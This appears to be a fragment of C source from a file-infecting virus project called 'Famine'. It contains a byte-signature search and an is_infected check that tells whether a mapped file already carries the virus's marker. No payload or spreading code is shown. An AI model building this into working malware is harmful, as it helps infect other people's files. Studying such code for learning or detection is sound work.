#include "../inc/famine.h"

static char	*ft_find_str(const char *haystack, size_t n)
{
	unsigned int	i;
	unsigned int	j;
	unsigned int	k;
    const char needle[] = SIGN;

	i = 0;
	if (!needle[0])
		return ((char *)haystack);
	while (n--)
	{
		j = i;
		k = 0;
		while (haystack[j] == needle[k])
		{
			j++;
			k++;
			if (!needle[k])
				return ((char *)&haystack[i]);
		}
		i++;
	}
	return (NULL);
}

bool    is_infected(char *path_file, t_file *file)
{
    if(!open_map(path_file, file))
        return ((file->error = 1) - 1);
    if(ft_find_str(file->data, file->size))
        return(1);
    return(0);
}